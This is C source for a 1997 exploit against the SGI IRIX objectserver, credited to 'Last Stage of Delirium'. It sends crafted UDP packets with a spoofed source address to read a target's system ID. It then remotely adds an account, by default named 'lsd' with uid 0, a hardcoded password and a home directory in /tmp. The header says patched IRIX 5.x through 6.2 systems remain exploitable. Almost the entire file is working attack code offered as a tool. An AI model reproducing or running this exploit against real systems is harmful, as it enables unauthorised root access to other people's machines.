/*   Copyright (c) July 1997       Last Stage of Delirium   */
/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF      */
/*                  Last Stage of Delirium                  */
/*                                                          */
/*   The contents of this file  may be disclosed to third   */
/*   parties, copied and duplicated in any form, in whole   */
/*   or in part, without the prior written consent of LSD.  */

/*   SGI objectserver "account" exploit                                
*/
/*   Remotely adds account to the IRIX system.                         
*/
/*   Tested on IRIX 5.2, 5.3, 6.0.1, 6.1 and even 6.2,                 
*/
/*   which was supposed to be free from this bug (SGI 19960101-01-PX). 
*/
/*   The vulnerability "was corrected" on 6.2 systems but              
*/
/*   SGI guys fucked up the job and it still can be exploited.         
*/
/*   The same considers patched 5.x,6.0.1 and 6.1 systems              
*/
/*   where SGI released patches DONT work.                             
*/
/*   The only difference is that root account creation is blocked.     
*/
/*                                                                     
*/
/*   usage: ob_account ipaddr [-u username] [-i userid] [-p]           
*/
/*       -i  specify userid (other than 0)                             
*/
/*       -u  change the default added username                         
*/
/*       -p  probe if there's the objectserver running                 
*/
/*                                                                     
*/
/*   default account added       : lsd                                 
*/
/*   default password            : m4c10r4!                            
*/
/*   default user home directory : /tmp/.new                           
*/
/*   default userid              : 0                                   
*/


#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/uio.h>
#include <errno.h>
#include <stdio.h>
#define E if(errno) perror("");

struct iovec iov[2];
struct msghdr msg;
char buf1[1024],buf2[1024];
int sck;
unsigned long adr;

void show_msg(){
    char *p,*p1;
    int i,j,c,d;

    c=0;
    printf("%04x   ",iov[0].iov_len);
    p=(char*)iov[0].iov_base;
    for(i=0;i<iov[0].iov_len;i++){
        c++;
        if(c==17){
             printf("    ");
             p1=p;p1=p1-16;
             for(j=0;j<16;j++){
                 if(isprint(*p1)) printf("%c",*p1);
                 else printf(".");
                 p1++;
             }
             c=1;
             printf("\n       ");
        }
        printf("%02x ",(unsigned char)*p++);
    }
    printf("    ");
    p1=p;p1=p1-c;
    if(c>1){
        for(i=0;i<(16-c);i++) printf("   ");
        for(i=0;i<c;i++){
            if(isprint(*p1)) printf("%c",*p1);
            else printf(".");
            p1++;
        }
    }
    printf("\n");
    if(msg.msg_iovlen!=2) return;

    c=0;
    p=(char*)iov[0].iov_base;
    d=p[0x0a]*0x100+p[0x0b];
    p=(char*)iov[1].iov_base;
    printf("%04x   ",d);
    for(i=0;i<d;i++){
        c++;
        if(c==17){
             printf("    ");
             p1=p;p1=p1-16;
             for(j=0;j<16;j++){
                 if(isprint(*p1)) printf("%c",*p1);
                 else printf(".");
                 p1++;
             }
             c=1;
             printf("\n       ");
        }
        printf("%02x ",(unsigned char)*p++);
    }
    printf("    ");
    p1=p;p1=p1-c;
    if(c>1){
        for(i=0;i<(16-c);i++) printf("   ");
        for(i=0;i<c;i++){
            if(isprint(*p1)) printf("%c",*p1);
            else printf(".");
            p1++;
        }
    }
    printf("\n");
    fflush(stdout);
}

char numer_one[0x10]={
0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,
0x00,0x00,0x00,0x24,0x00,0x00,0x00,0x00
};

char numer_two[0x24]={
0x21,0x03,0x00,0x43,0x00,0x0a,0x00,0x0a,
0x01,0x01,0x3b,0x01,0x6e,0x00,0x00,0x80,
0x43,0x01,0x01,0x18,0x0b,0x01,0x01,0x3b,
0x01,0x6e,0x01,0x02,0x01,0x03,0x00,0x01,
0x01,0x07,0x01,0x01
};

char dodaj_one[0x10]={
0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,
0x00,0x00,0x01,0x2a,0x00,0x00,0x00,0x00
};

char dodaj_two[1024]={
0x1c,0x03,0x00,0x43,0x02,0x01,0x1d,0x0a,
0x01,0x01,0x3b,0x01,0x78
};

char dodaj_three[27]={
0x01,0x02,0x0a,0x01,0x01,0x3b,
0x01,0x78,0x00,0x00,0x80,0x43,0x01,0x10,
0x17,0x0b,0x01,0x01,0x3b,0x01,0x6e,0x01,
0x01,0x01,0x09,0x43,0x01
};

char dodaj_four[200]={
0x17,0x0b,0x01,0x01,0x3b,0x01,0x02,
0x01,0x01,0x01,0x09,0x43,0x01,0x03,0x4c,
0x73,0x44,0x17,0x0b,0x01,0x01,0x3b,0x01,
0x6e,0x01,0x06,0x01,0x09,0x43,0x00,0x17,
0x0b,0x01,0x01,0x3b,0x01,0x6e,0x01,0x07,
0x01,0x09,0x43,0x00,0x17,0x0b,0x01,0x01,
0x3b,0x01,0x02,0x01,0x03,0x01,0x09,0x43,
0x00,0x17,0x0b,0x01,0x01,0x3b,0x01,0x6e,
0x01,0x09,0x01,0x09,0x43,0x00,0x17,0x0b,
0x01,0x01,0x3b,0x01,0x6e,0x01,0x0d,0x01,
0x09,0x43,0x00,0x17,0x0b,0x01,0x01,0x3b,
0x01,0x6e,0x01,0x10,0x01,0x09,0x43,0x00,
0x17,0x0b,0x01,0x01,0x3b,0x01,0x6e,0x01,
0x0a,0x01,0x09,0x43,0x00,0x17,0x0b,0x01,
0x01,0x3b,0x01,0x6e,0x01,0x0e,0x01,0x03,
0x01,0x09,0x17,0x0b,0x01,0x01,0x3b,0x01,
0x6e,0x01,0x04,0x01,0x09,0x43,0x01,0x0d,
0x61,0x6b,0x46,0x4a,0x64,0x78,0x65,0x6e,
0x4b,0x6e,0x79,0x53,0x2e,0x17,0x0b,0x01,
0x01,0x3b,0x01,0x6e,0x01,0x11,0x01,0x09,
0x43,0x01,0x09,0x2f,0x74,0x6d,0x70,0x2f,
0x2e,0x6e,0x65,0x77,0x17,0x0b,0x01,0x01,
0x3b,0x01,0x6e,0x01,0x12,0x01,0x09,0x43,
0x01,0x04,0x72,0x6f,0x6f,0x74,0x17,0x0b,  
0x01,0x01,0x3b,0x01,0x6e,0x01,0x02,0x01,
0x03
};

char dodaj_five[39]={
0x17,0x0b,0x01,0x01,0x3b,0x01,
0x6e,0x01,0x13,0x01,0x09,0x43,0x01,0x08,
0x2f,0x62,0x69,0x6e,0x2f,0x63,0x73,0x68,
0x17,0x0b,0x01,0x01,0x3b,0x01,0x6e,0x01,
0x0f,0x01,0x09,0x43,0x01,0x03,'L','S','D'
};

char fake_adrs[0x10]={
0x00,0x02,0x14,0x0f,0xff,0xff,0xff,0xff,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

char *get_sysinfo(){
    int i=0,j,len;

    iov[0].iov_base=numer_one;
    iov[0].iov_len=0x10;
    iov[1].iov_base=numer_two;
    iov[1].iov_len=0x24;
    msg.msg_name=(caddr_t)fake_adrs;
    msg.msg_namelen=0x10;
    msg.msg_iov=iov;
    msg.msg_iovlen=2;
    msg.msg_accrights=(caddr_t)0;
    msg.msg_accrightslen=0;
    printf("SM:  --[0x%04x bytes]--\n",sendmsg(sck,&msg,0)); show_msg();
    printf("\n");

    iov[0].iov_base=buf1;
    iov[1].iov_base=buf2;
    iov[1].iov_len=0x200;
    msg.msg_iovlen=2;
    printf("RM:  --[0x%04x bytes]--\n",len=recvmsg(sck,&msg,0));
show_msg();
    printf("\n");
    while(i<len-0x16) 
        if(!memcmp("\x0a\x01\x01\x3b\x01\x78",&buf2[i],6)){
            printf("remote system ID: ");
            for(j=0;j<buf2[i+6];j++) printf("%02x ",buf2[i+7+j]);
            printf("\n"); 
            return(&buf2[i+6]);
        }else i++;
    return(0);
}

void new_account(int len){
    iov[0].iov_base=dodaj_one;
    iov[0].iov_len=0x10;
    iov[1].iov_base=dodaj_two;
    iov[1].iov_len=len;
    msg.msg_name=(caddr_t)fake_adrs;
    msg.msg_namelen=0x10;
    msg.msg_iov=iov;
    msg.msg_iovlen=2;
    msg.msg_accrights=(caddr_t)0;
    msg.msg_accrightslen=0;
    printf("SM:  --[0x%04x bytes]--\n",sendmsg(sck,&msg,0)); show_msg();
    printf("\n");

    iov[0].iov_base=buf1;
    iov[1].iov_base=buf2;
    iov[1].iov_len=0x200;
    msg.msg_iovlen=2;
    printf("RM:  --[0x%04x bytes]--\n",recvmsg(sck,&msg,0)); show_msg();
    printf("\n");
}

void info(char *text){
    printf("SGI objectserver \"account\" exploit by LSD\n");
    printf("usage: %s ipaddr [-u username] [-i userid] [-p]\n",text);
}

main(int argc,char **argv){
    int c,user,version,probe;
    unsigned int offset,gr_offset,userid;
    char *sys_info;
    char username[20];
    extern char *optarg;
    extern int optind; 

    if(argc<2) {info(argv[0]);exit(0);}
    optind=2;
    offset=40;
    user=version=probe=0;
    while((c=getopt(argc,argv,"u:i:p"))!=-1)
        switch(c){
        case 'u': strcpy(username,optarg);
                  user=1;
                  break;
        case 'i': version=62;
                  userid=atoi(optarg);
                  break;
        case 'p': probe=1;
                  break;
        case '?':
        default : info(argv[0]); 
                  exit(1);
        }

    sck=socket(AF_INET,SOCK_DGRAM,0);
    adr=inet_addr(argv[1]);
    memcpy(&fake_adrs[4],&adr,4);

    if(!(sys_info=get_sysinfo())){
        printf("error: can't get system ID for %s.\n",argv[1]);
        exit(1);
    }
    if(!probe){
        memcpy(&dodaj_two[0x0d],sys_info,sys_info[0]+1);
        memcpy(&dodaj_two[0x0d+sys_info[0]+1],&dodaj_three[0],27);
        offset+=sys_info[0]+1; 

        if(!user) strcpy(username,"lsd");
        dodaj_two[offset++]=strlen(username);
        strcpy(&dodaj_two[offset],username);offset+=strlen(username);
        memcpy(&dodaj_two[offset],&dodaj_four[0],200);
        offset+=200;
        gr_offset=offset-15;
        if(version){ 
            dodaj_two[gr_offset++]='u'; 
            dodaj_two[gr_offset++]='s'; 
            dodaj_two[gr_offset++]='e'; 
            dodaj_two[gr_offset++]='r'; 
            dodaj_two[offset++]=0x02;
            dodaj_two[offset++]=userid>>8;
            dodaj_two[offset++]=userid&0xff; 
        }
        else dodaj_two[offset++]=0x00; 
    
        memcpy(&dodaj_two[offset],&dodaj_five[0],39);
        offset+=39;
        dodaj_one[10]=offset>>8;
        dodaj_one[11]=offset&0xff;
        new_account(offset);
    }
}
/* end g23 exploit post */
